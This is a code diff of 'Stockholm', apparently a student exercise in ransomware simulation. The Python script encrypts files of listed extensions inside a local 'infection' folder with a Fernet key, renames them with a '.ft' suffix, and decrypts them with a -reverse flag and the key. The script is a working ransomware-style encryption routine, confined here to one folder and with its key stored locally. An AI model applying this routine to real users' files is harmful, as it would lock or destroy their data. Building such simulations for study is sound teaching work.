@@ -1,139 +1,165 @@
-#!/Volumes/sgoinfre/students/$USER/homebrew/bin/python3
+#!/usr/bin/python3.9
 import sys
 from os import listdir, rename
-from os.path import split
+from os.path import split, splitext
 from cryptography.fernet import Fernet
 
-folder="infection"
+folder = "infection"
 
-class bcolors:
-    OKBLUE = '\033[94m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
+class bcol:
+    GREEN = '\033[2;32m'
+    BACKGR = '\033[7m'
     FAIL = '\033[91m'
     ENDC = '\033[0m'
-    GREY = '\033[2m'
     CURSI = '\033[3m'
     UNDERLINE = '\033[4m'
-    
 
-def load_key():
+def load_list_ext():
+    txt_file = open("ext/extensions.txt", "r")
+    content = txt_file.read()
+    content_list = content.split('\n')
+    txt_file.close()
+    return content_list
 
-    return open("key.key", "rb").read()
+def encrypt_file(extensions, src, k, silence):
 
-def encrypt_file(dst, k, silence):
-
-    newfile = split(dst)
-    if newfile[1].endswith('.ft'):
-        with open(dst, 'rb') as o_file:
-            r_file = o_file.read()
-        crypt = k.encrypt(r_file)
-        with open(dst, 'wb') as crypt_file:
-            crypt_file.write(crypt)
-    if silence == False:
-        print(newfile[1], "encripted")
+    newfile = split(src)
+    ext = splitext(newfile[1])
+    if ext[1] != "" and ext[1] != None:
+        if ext[1] in extensions:
+            with open(src, 'rb') as o_file:
+                r_file = o_file.read()
+                crypt = k.encrypt(r_file)
+            with open(src, 'wb') as crypt_file:
+                crypt_file.write(crypt)
+            if not newfile[1].endswith('.ft'):
+                name = newfile[1]
+                newname = name + '.ft'
+                dst = folder + '/' + newname
+                rename(src, dst)
+                if silence == False:
+                    print(bcol.GREEN + newname + " encripted" + bcol.ENDC)
+            else:
+                if silence == False:
+                    print(bcol.GREEN + newfile[1] + " encripted" + bcol.ENDC)
 
 def decrypt_file(src, k, silence):
 
     newfile = split(src)
     if newfile[1].endswith('.ft'):
-        name =  newfile[1]
-        newname = name.replace('.ft', '')
-        dst = folder + '/' + newname
-        rename(src, dst)
-        with open(dst, 'rb') as o_file:
+        with open(src, 'rb') as o_file:
             r_file = o_file.read()
-        decrypt = k.decrypt(r_file)
-        with open(dst, 'wb') as crypt_file:
-            crypt_file.write(decrypt)
-    if silence == False:
-        print(name + " decriped as " + newname)
+            decrypt = k.decrypt(r_file)
+            with open(src, 'wb') as crypt_file:
+                crypt_file.write(decrypt)
+            name =  newfile[1]
+            newname = name.replace('.ft', '')
+            dst = folder + '/' + newname
+            rename(src, dst)
+            if silence == False:
+                print(bcol.GREEN + name + " decriped as " + newname + bcol.ENDC)
 
-def switch_crypt(mode, src, k, silence):
+def switch_crypt(extensions, mode, src, k, silence):
 
     if mode == "rev":
         decrypt_file(src, k, silence)
     else:
-        encrypt_file(src, k, silence)
+        encrypt_file(extensions, src, k, silence)
 
 def check_key(inputkey):
 
-    with open("key.key", "r") as mykey:
+    with open("utils/key.key", "r") as mykey:
             key = mykey.read()
     if not inputkey == key:
         return None
     else:
         return 1
 
-def call_rev_files(key, silence):
-
-    mode = "rev"
-    if check_key(key) == 1:
-        files_treat(mode, silence, key)
-    else:
-        print(bcolors.FAIL + "ERROR: Invalid syntax or incorrect key.")
-
-def files_treat(mode, silence, key):
+def files_treat(extensions, mode, silence, key):
     
     folder = "infection"
     if key == "":
-        with open("key.key", "rb") as mykey:
+        with open("utils/key.key", "rb") as mykey:
                 key = mykey.read()
     k = Fernet(key)
     for count, filename in enumerate(listdir(folder)):
-        modified_file = False
         src = folder + '/' + filename
-        if not filename.endswith('.ft'):
-            modified_file = True
-            newname = filename + '.ft'
-            dst = folder + '/' + newname
-            rename(src, dst)
-        if modified_file == True:
-            switch_crypt(mode, dst, k, silence)
-        else:
-            switch_crypt(mode, src, k, silence)
+        switch_crypt(extensions, mode, src, k, silence)
+
+def call_rev_files(extensions, key, silence):
+
+    mode = "rev"
+    if check_key(key) == 1:
+        files_treat(extensions, mode, silence, key)
+    else:
+        print(bcol.FAIL + "ERROR: Invalid syntax or incorrect key.\n" + bcol.ENDC)
 
 def help_messages():
 
-    print("\n* * * * * * * * * * * * * * * * * * * * * * * * * *\n")
+    print("\n* * * * * * * * * * * * * * * * * * * * * * * * * *")
+    print("")
     print("Stockholm encrypts local files from a specific folder.")
-    print("\nThere exists flags to interact with the rogram:")
-    print(bcolors.UNDERLINE + "\nFLAGS")
-    print(bcolors.ENDC + "\t[ -help ][ -h ] Shows avaible flags for the program.")
+    print("")
+    print("There exists flags to interact with the rogram:")
+    print(bcol.UNDERLINE)
+    print("FLAGS")
+    print(bcol.ENDC + "\t[ -help ][ -h ] Shows avaible flags for the program.")
     print("\t[ -reverse ][ -r ] Decrypt files using it along with decryption key [ ./stock.py -reverse + [key] ]")
     print("\t[ -silent ][ -s ] Silences the file de/encryption process. [./stock.py -silent] or " +
         "[./stock.py -silent -reverse + [key] ]")
     print("\t[ -version ][ -v ] Shows program version.")
+    print("")
+    print("\n* * * * * * * * * * * * * * * * * * * * * * * * * *\n")
+
+def version_messages():
+
+    print("")
+    print(bcol.CURSI + "Stock(holm) version 1.0")
+    print("")
+    print("July 2022")
+    print(bcol.ENDC)
+
+def many_args_messages():
+    print(bcol.FAIL)
+    print("[ERROR]" + bcol.ENDC + " Too many arguments.")
+    print("Try [ ./stock.py -help ]")
+    print("")
 
 def main(argv):
 
     key = ""
     mode = "crypt"
-    
+    lst = load_list_ext()
     if len(argv) > 4:
-        print(bcolors.FAIL + "\n[ERROR]" + bcolors.ENDC + " Too many arguments. \nTry [ ./stock -help ]")
+        many_args_messages()
     elif len(argv) > 1:
         if argv[1] == "-help" or argv[1] == "-h":
             help_messages()
         elif argv[1] == "-version" or argv[1] == "-v":
-            print( bcolors.CURSI + "\nStock(holm) version 1.0\nJuly 2022")
+            version_messages()
         elif argv[1] == "-silent" or argv[1] == "-s":
             if len(argv) == 2:
-                files_treat(mode, True, key)
+                files_treat(lst, mode, True, key)
             elif len(argv) == 3:
-                print(bcolors.FAIL + "\n[ERROR]" + bcolors.ENDC + " Did you mean [ " + argv[0] + " -silent -reverse <key> ] ?")
+                print("")
+                print(bcol.FAIL + "[ERROR]" + bcol.ENDC + " Did you mean [ " + argv[0] + " -silent -reverse <key> ] ?\n")
             elif len(argv) == 4:
-                call_rev_files(argv[3], True)
+                call_rev_files(lst, argv[3], True)
         elif argv[1] == "-reverse" or argv[1] == "-r":
             if len(argv) < 3:
-                print ("Introducce the key [ -reverse + <key> ]")
+                print("")
+                print ("Introducce the key [ -reverse + <key> ]\n")
             elif len(argv) == 4:
-                print(bcolors.FAIL + "\n[ERROR]" + bcolors.ENDC + " Did you mean [ " + argv[0] + " -silent -reverse <key> ] ?")
+                print("")
+                print(bcol.FAIL + "[ERROR]" + bcol.ENDC + " Did you mean [ " + argv[0] + " -silent -reverse <key> ] ?\n")
             else:
-                call_rev_files(argv[2], False)
+                call_rev_files(lst, argv[2], False)
+        else:
+            print(bcol.BACKGR)
+            print("Unrecognized command")
+            print(bcol.ENDC)
     else:
-        files_treat(mode, False, key)
-
+        files_treat(lst, mode, False, key)
 
 if __name__ == '__main__':
     main(sys.argv)
